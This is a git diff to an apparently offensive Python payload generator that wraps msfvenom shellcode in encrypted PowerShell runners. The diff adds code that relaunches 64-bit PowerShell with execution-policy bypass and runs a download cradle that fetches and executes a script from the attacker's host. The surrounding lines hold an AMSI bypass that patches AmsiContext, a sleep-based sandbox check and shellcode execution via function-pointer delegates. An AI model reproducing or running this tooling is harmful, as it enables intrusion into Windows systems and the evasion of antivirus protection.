@@ -116,8 +116,16 @@ if __name__ == '__main__':
 	else:
 		msfvenomoutput("Msfvenom warning messages - review to ensure all options successfully validated:", shellcode.stderr)
 
+	# create cradle here to allow addition to migrate64
+	if stager:
+		cradle = "powershell iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + stagerfile + "')"
+	else:
+		cradle = "iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + payloadfile + "')"
+
 	# Patch 1st 4 bytes of AmsiContext struct for the PS process. Does not fail if no AmsiContext buffer is found (Amsi not active)
 	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}"""
+	# re-execute in 64-bit powershell if running in a 32-bit process on a 64-bit machine
+	migrate64="""if($env:PROCESSOR_ARCHITEW6432 -eq "AMD64"){ &"$env:WINDIR\\sysnative\\windowspowershell\\v1.0\\powershell.exe" -Exec bypass -NonInteractive -NoProfile \"""" + cradle + "\"}"
 
 	print("Generating AES-256 key...")
 	powershellkeygen = "$aesKey = New-Object byte[] 32;$rng = [Security.Cryptography.RNGCryptoServiceProvider]::Create();$rng.GetBytes($aesKey);$aesKey" #pwshgenerate random aes-256 key
@@ -171,7 +179,7 @@ function getStrawberries($a) {
  $decrypted = $decrypted.split(",")
  return $decrypted
 } 
-""" + amsiBypass + """
+""" + migrate64 + '\n\n' + amsiBypass + """
 $starttime = Get-Date -Displayhint Time
 Start-sleep -s 5
 $finishtime = Get-Date -Displayhint Time
@@ -198,9 +206,6 @@ $addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((
 		print("Runner written to " + payloadfile + "!")
 	print("\nGeneration Complete!")
 	if stager:
-		cradle = "powershell iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + stagerfile + "')"
 		print("\nPS download cradle for CMD.exe usage: " + cradle)
 	else:
-		cradle = "iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + payloadfile + "')"
 		print("\nPS download cradle for Powershell.exe usage: " + cradle)
-	print("\nIf you are running from a 32 bit process on a 64 bit machine (i.e. psexec) use %SystemRoot%\sysnative\WindowsPowerShell\\v1.0\powershell.exe!")
